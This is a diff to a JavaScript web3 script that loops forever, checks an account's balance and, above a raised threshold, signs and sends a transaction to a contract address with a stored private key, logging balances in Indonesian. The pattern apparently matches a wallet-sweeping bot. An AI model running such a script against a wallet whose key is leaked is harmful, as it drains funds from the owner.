@@ -25,7 +25,6 @@ async function sendBalance() {
     console.log('############################################################################')
     while (true) {
       const nonce = await web3.eth.getTransactionCount(from);
-
       const rawTransaction = {
         from,
         to: contractAddress,
@@ -36,7 +35,7 @@ async function sendBalance() {
       };
       const balance = await web3.eth.getBalance(from)
       try {
-            if (balance > 100000000000000) {
+        if (balance > 500000000000000) {
               const signedTransaction = await web3.eth.accounts.signTransaction(rawTransaction, privateKey);
               const transaction = await web3.eth.sendSignedTransaction(signedTransaction.rawTransaction);
               if (transaction.status) {
@@ -44,10 +43,13 @@ async function sendBalance() {
                 console.log('Tx Hash:',transaction.transactionHash)
                 continue
               }
+            } else {
+          console.log('Scanning Saldo..')
+          console.log('balance :', web3.utils.fromWei(balance.toString(), 'ether'))
             }
           } catch (error) {
-            console.log('Scanning Saldo..')
-            console.log('balance :', web3.utils.fromWei(balance.toString(), 'ether'))
+        console.log('Scanning Ulang Saldo..')
+        console.log('balance :', web3.utils.fromWei(balance.toString(), 'ether'))
             continue
         }
         }
